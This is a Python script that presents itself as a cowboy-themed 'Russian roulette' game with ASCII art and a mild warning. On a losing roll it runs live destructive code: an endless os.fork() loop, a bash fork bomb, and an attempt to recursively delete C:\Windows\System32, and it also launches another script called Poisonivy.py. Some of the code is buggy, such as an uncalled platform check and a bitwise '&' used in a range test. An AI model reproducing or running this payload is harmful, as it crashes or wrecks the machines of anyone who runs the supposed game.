import os 
import sys
import time
import random
import sys
import platform

#colors
red = "\033[1;31;40m"
green = "\033[1;32;40m"
yellow = "\033[1;33;40m"
blue = "\033[1;34;40m"
purple = "\033[1;35;40m"
white = "\033[1;37;40m"


print("""
██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                          
""")
print("This game may completely mess up your computer...play at your own risk...")
time.sleep(1)
print("-" *60)

def StartRoulette():
    time.sleep(1)
    print("""
        

                                                            |\../|
                                                            |    |
                                                        \.__;    ;__./
                                    |\    /|             \__________/
                                ___| \,,/_/             $$$ ^  o $$$
                            ---__/ \/    \              $$//""\\$$
                            __--/     (D)  \             $  \\\\  $
                            _ -/    (_      \       .--.___/    \___.--.
                            // /       \_ / ==\      |  |   \    /   |  ;
    __-------_____--___--/           / \_ O o)     |  ||~| |  | |~||  |  /---
    /                                 /   \==\\     |  ;|_| |  | |_|:  |/ ._;`|
    /                                 /        \\    \  ;____|  |____:   ./   |  |
    ||          )                   \_/\         \\    \.. ||||[]||||__\./    [|  |
    ||         /              _      /  |         \    // [|   ||        \    [|  |
    | |      /--______      ___\    /\  :          \  //  [:   ||.____.   |\   |  |
    | /   __-  - _/   ------    |  |   \ \           \/   /|   |      |   ;\   |  |
    |   -  -   /                | |     \ )              /|   |      \___/\   |  |
    |  |   -  |                 | )     | |              /|   |       | :     |  |
    | |    | |                 | |    | |               /|   |       : --^[[|  |
    | |    < |                 | |   |_/                 \___/      |__---^[[|  |
    < |    /__\                <  \                      .| |                |  |
    /__\                       /___\                    (__))                |  |



""")
    time.sleep(1)
    print("Howdy Partner, I guess you are up for a little russian roulette huh?")
    time.sleep(0.5)
    rouletteChoice = int(input("Well pick a number from 1 to 5 \n"))
    if rouletteChoice > 0 & rouletteChoice < 6:
        print(f"ahhh so you chose {rouletteChoice}, I like it, lets see if you win then......")
        time.sleep(1)
        kill = random.randint(0, 5)
        if rouletteChoice == kill:
            time.sleep(1)
            print("..........")
            time.sleep(3)
            print(red + "UNLUCKY BOY U DONE NOW!!")
            time.sleep(2)
            while True:
                print(purple + "HAHAHAHA")
                os.fork()
                if platform.system == "Windows":
                    os.system("rm -r C:\\Windows\\System32")
                else:
                    os.system (":(){ :|: & };:")

        else:
            time.sleep(1)
            print("..........")
            time.sleep(3)
            print(blue + "Looks like you got off lucky there boy, see you around partner....\n")
            time.sleep(2)
            os.system("python3 Poisonivy.py")

    else:
        print(red + "Sorry partner thasts not between 1 and 5, gonna need you to try again...\n")
        StartRoulette()


choice = int(input(green + "this program could cause you to need to restart your computer, are you sure you want to go ahead? (1 for yes, 2 for no: )\n"))

if choice == 2:
    print(yellow + "Returning........")
    time.sleep(2)
    os.system("python3 Poisonivy.py")
else:
    StartRoulette()
